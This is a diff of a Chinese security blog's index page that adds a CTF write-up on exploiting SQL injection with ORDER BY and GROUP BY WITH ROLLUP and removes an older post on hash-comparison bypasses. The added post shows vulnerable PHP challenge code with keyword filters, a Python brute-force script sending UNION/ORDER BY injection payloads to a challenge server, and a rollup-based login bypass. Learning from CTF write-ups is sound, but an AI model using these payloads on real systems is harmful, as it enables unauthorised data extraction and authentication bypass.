@@ -41,9 +41,9 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>23</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>24</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
-      <a href="/tags"><div><strong>11</strong><br>标签</div></a>
+      <a href="/tags"><div><strong>12</strong><br>标签</div></a>
     </div>
     <ul class="blog-link">
      
@@ -68,6 +68,65 @@
 </div>
 
         <section id="main">
+  
+    <article id="post-order by和group by在sql注入中的妙用" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/05/23/order by和group by在sql注入中的妙用/" class="article-date">
+  <time class="post-time" datetime="2018-05-23T03:12:12.000Z" itemprop="datePublished">
+    <span class="post-month">5月</span><br/>
+    <span class="post-day">23</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/05/23/order by和group by在sql注入中的妙用/">order by以及group by在sql注入中的妙用</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近Iscc的注入题目真是让人发疯，为此我找了一些sql注入来练手，发现了这么几道有趣的题目，来记录一下  </p>
+<h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><p>总所周知，在sql注入中，我们一般使用<strong>order by</strong>来确定列数，这样有助于我们使用联合查询来查询我们所要的数据，为何可以查询出我们所要的数据呢？因为order by是一个排序的函数，order by x的意思是对x列的数据进行ascii码的排序，如果这一列不存在，那么就会报错，所以可以达到确定列数的作用。例子就借鉴大手子的吧。<br><img src="https://upload-images.jianshu.io/upload_images/3372127-999e68d5df275dfb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><img src="https://upload-images.jianshu.io/upload_images/3372127-e0876d231d209f40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""> </p>
+<h3 id="例子如下"><a href="#例子如下" class="headerlink" title="例子如下"></a>例子如下</h3><p>扫出有源码，如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $dbhost = &quot;localhost&quot;;</span><br><span class="line">  $dbuser = &quot;root&quot;;</span><br><span class="line">  $dbpass = &quot;123456&quot;;</span><br><span class="line">  $db = &quot;ctf&quot;;</span><br><span class="line">  $conn = mysqli_connect($dbhost,$dbuser,$dbpass,$db);</span><br><span class="line">  mysqli_set_charset($conn,&quot;utf8&quot;);</span><br><span class="line"> </span><br><span class="line">  /* sql</span><br><span class="line"> </span><br><span class="line">     create  table `admin` (</span><br><span class="line">        `id` int(10) not null primary key auto_increment,</span><br><span class="line">        `username` varchar(20) not null ,</span><br><span class="line">        `password` varchar(32) not null</span><br><span class="line">     );</span><br><span class="line">  */</span><br><span class="line">function   filter($str)&#123;</span><br><span class="line">      $filterlist = &quot;/\(|\)|username|password|where|</span><br><span class="line">      case|when|like|regexp|into|limit|=|for|;/&quot;;</span><br><span class="line">      if(preg_match($filterlist,strtolower($str)))&#123;</span><br><span class="line">        die(&quot;illegal input!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      return $str;</span><br><span class="line">  &#125;</span><br><span class="line">$username = isset($_POST[&apos;username&apos;])?</span><br><span class="line">filter($_POST[&apos;username&apos;]):die(&quot;please input username!&quot;);</span><br><span class="line">$password = isset($_POST[&apos;password&apos;])?</span><br><span class="line">filter($_POST[&apos;password&apos;]):die(&quot;please input password!&quot;);</span><br><span class="line">$sql = &quot;select * from admin where  username =</span><br><span class="line"> &apos;$username&apos; and password = &apos;$password&apos; &quot;;</span><br><span class="line"> </span><br><span class="line">$res = $conn -&gt; query($sql);</span><br><span class="line">if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line">  $row = $res -&gt; fetch_assoc();</span><br><span class="line">  if($row[&apos;id&apos;])&#123;</span><br><span class="line">     echo $row[&apos;username&apos;];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   echo &quot;The content in the password column is the flag!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>从源码可以得出，在这个<strong>admin</strong>表中有三列。其次呢，发现这题目过滤了<strong>password，username，=</strong>等等，然后就是回显的要求了，要求我们输入的数据在数据库里面存在，然后通过id给我们返回username，但是我们所要的flag在password里面，这里就需要我们用一些特殊的方法来把password提取出来，由于回显，我们考虑一下布尔型注入，发现<strong>（）</strong>被ban了，所以这一条路是走不通了，不过仔细观察发现，我们除了<strong>union select</strong>还可以利用’以及order by等函数。结合回显是通过id来查询，所以我们可以使用order by进行排序然后通过不同输出判断密码值。我们可以试试。<br>首先通过构造<strong>‘ or 1#</strong>查查原来的username。<br><img src="/images/13/1.png" alt=""><br>再查询一下回显位。<br><img src="/images/13/2.png" alt=""><br>接着按照我们的思路来试试。<br><img src="/images/13/3.png" alt=""><br><img src="/images/13/4.png" alt=""><br>测试完了接下来就可以使用爆破来出flag了。脚本如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url = &quot;http://202.98.28.108:10801/47g256f48gff/&quot;</span><br><span class="line">l = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span><br><span class="line">number = len(l)</span><br><span class="line">password = list()</span><br><span class="line">flag = 0</span><br><span class="line">ps = &quot;&quot;</span><br><span class="line">for i in range(0,32):#32位</span><br><span class="line">    for j in range(0,number):</span><br><span class="line">        p = &quot;&quot;</span><br><span class="line">        password.append(l[j])</span><br><span class="line">        p = p.join(password)</span><br><span class="line">        r = requests.post(url,data=&#123;&quot;username&quot;:&quot;whaleadmin&apos; union select 1,2,&apos;%s&apos; order by 3#&quot;%(p),&quot;password&quot;:&quot;1&quot;&#125;)</span><br><span class="line">        if &quot;whaleadmin&quot; in r.content:</span><br><span class="line">            if j == 0:</span><br><span class="line">                flag = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                password.pop(len(password) - 1)</span><br><span class="line">                password.append(l[j - 1])</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            password.pop(len(password) - 1)</span><br><span class="line">    if flag == 1:</span><br><span class="line">        break</span><br><span class="line">    print password</span><br><span class="line">print ps.join(password)#输出的密码最后一位需要后移一位</span><br></pre></td></tr></table></figure></p>
+<p>爆破出密码之后md5解密一下flag就出来了。</p>
+<h2 id="group-by以及with-rollup"><a href="#group-by以及with-rollup" class="headerlink" title="group by以及with rollup"></a>group by以及with rollup</h2><p>group by顾名思义就是把不同数据总和起来，然后进行排序输出。具体的例子可以去这里看看<strong><a href="https://www.cnblogs.com/jingfengling/p/5962182.html" target="_blank" rel="noopener">https://www.cnblogs.com/jingfengling/p/5962182.html</a></strong>，我这里就不多阐述了。<br>字句<strong>with rollup</strong>，求平均值的字句用法也不多说，参考<strong><a href="https://blog.csdn.net/id19870510/article/details/6254358" target="_blank" rel="noopener">https://blog.csdn.net/id19870510/article/details/6254358</a></strong></p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>题目地址:<a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/index.php</a> ，这是实验吧的一道题目。<br>首先f12有个提示，访问/source.txt得到源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&apos;uname&apos;]) || !isset($_POST[&apos;pwd&apos;])) &#123;</span><br><span class="line">	echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;input type=&quot;submit&quot; /&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;/form&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;!--source: source.txt--&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;  </span><br><span class="line">    if (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123;   </span><br><span class="line">        print &quot;水可载舟，亦可赛艇！&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;</span><br><span class="line">foreach($_POST as $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">	die(&apos;Could not connect: &apos; . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=&quot;XXXXXX&quot;;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql=&quot;SELECT * FROM interest WHERE uname = &apos;&#123;$_POST[&apos;uname&apos;]&#125;&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line">if (mysql_num_rows($query) == 1) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;亦可赛艇！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	print &quot;一颗赛艇！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>源码审计，发现题目过滤了很多东西，起码联合查询，延时注入，盲注都不太现实，但是这里依旧没有过滤select，接着看得到flag的要求。<br>首先我们输入一个用户名，网页通过查询数据库得到该用户名的密码，再把该用户名的密码与我们所输入的进行匹配，如果成功，那么flag就到手了。<br>那么问题来了，我们根本不知道用户名，也不知道其密码是什么，如何达到匹配的效果呢？这里group by就派上了用场。注意这个<strong>$key</strong>是查询结果的赋值，我们在一定前提下是可以控制返回的数据的，根据gourp by的用法，我们可以构造一个语句使得查询的密码经过处理后为空，然后输入的密码也为空以此匹配。<br>构造<strong>‘ or 1 group by pwd with rollup limit 1 offset 0,1,2…….#</strong>偏移值一个一个试过去，毕竟不知道那个是有效值，经过尝试最终试出flag的偏移值为2。</p>
+<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>sql注入中的基操还是太多了，学不完学不完…….不过还是该学的得学，紧跟着大佬的步伐。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/05/23/order by和group by在sql注入中的妙用/" data-id="cjn3ccggd000vbkvejup8cklx" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
   
     <article id="post-入侵后台的一次尝试" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -212,7 +271,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/17/入侵后台的一次尝试/" data-id="cjmni3xu7000xywveqdf4o775" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/17/入侵后台的一次尝试/" data-id="cjn3ccggy0014bkve2z0b0f0c" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -275,7 +334,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/07/CBC字节反转攻击/" data-id="cjmni3xrp0006ywvem4441btv" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/07/CBC字节反转攻击/" data-id="cjn3ccg8l000cbkveza9p1lfs" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -340,7 +399,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/01/sql注入之报错注入/" data-id="cjmni3xuf0011ywve7o14qz89" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/05/01/sql注入之报错注入/" data-id="cjn3ccgh70019bkve41g4py69" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -398,7 +457,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/30/sql注入之时间盲注/" data-id="cjmni3xty000rywvei7vu87y9" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/30/sql注入之时间盲注/" data-id="cjn3ccggo000zbkvemv47u2hb" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -469,7 +528,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/29/sql注入之布尔型注入/" data-id="cjmni3xub000zywve6juxgfv4" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/29/sql注入之布尔型注入/" data-id="cjn3ccggi000xbkve027ofu0q" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -566,7 +625,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/21/关于sql注入的一些学习心得/" data-id="cjmni3xv2001eywvegudklnjt" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/21/关于sql注入的一些学习心得/" data-id="cjn3ccgh30017bkvehjr69w9g" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>
@@ -625,7 +684,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/11/初试Getshell/" data-id="cjmni3xvh001oywvel3qp754i" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/11/初试Getshell/" data-id="cjn3ccghj001hbkves44p1nso" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-shell/">web shell</a></li></ul>
@@ -686,7 +745,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/22/0x05-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjmni3xto000nywve06k7ccrc" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/22/0x05-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjn3ccg820004bkvebgwlniiq" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-PHP/">Web PHP</a></li></ul>
@@ -737,63 +796,7 @@ while flag:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/14/0x04-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjmni3xtg000kywveiv5hn6ws" class="article-share-link">分享</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-0x03-在蓝鲸打卡学到的基本操作（Web篇）" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/03/11/0x03-在蓝鲸打卡学到的基本操作（Web篇）/" class="article-date">
-  <time class="post-time" datetime="2018-03-11T14:00:11.000Z" itemprop="datePublished">
-    <span class="post-month">3月</span><br/>
-    <span class="post-day">11</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/03/11/0x03-在蓝鲸打卡学到的基本操作（Web篇）/">0x03 在蓝鲸打卡所学到的基本操作（Web篇）</a>
-    </h1>
-  
-
-        <div>
-          
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
-  </div>
-
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>##Web题目由于知识太过杂乱就不按照时间顺序来归纳了</p>
-<h3 id="等量登入"><a href="#等量登入" class="headerlink" title="等量登入"></a>等量登入</h3><p>这一次的题目是关于Hash函数漏洞的，计算hash的函数比如md5(),sha1()这两种是最为常见也是在代码审计中容易考到的。由于函数本身的缺陷以及在比较变量时候的不严谨，所以可以被大手子们上演各种花式操作来绕过。<br>弱类型比较：<br><img src="/images/3/1.jpg" alt=""><br>强类型比较：<br><img src="/images/3/2.jpg" alt=""><br>在代码审计中，碰到MD5()函数类型的比较就可以考虑0e开头的MD5值来进行构造，在碰到sha1()函数则可以考虑用数组的方式来进行构造，总的来说，理解函数的用法再来使用这个漏洞就行了。  </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/11/0x03-在蓝鲸打卡学到的基本操作（Web篇）/" data-id="cjmni3xrg0005ywve3ihqq46s" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/14/0x04-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjn3ccg8g000abkvevmnqwuq7" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -851,9 +854,9 @@ while flag:
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>23</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>24</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
-      <a href="/tags"><div><strong>11</strong><br>标签</div></a>
+      <a href="/tags"><div><strong>12</strong><br>标签</div></a>
     </div>
 
 
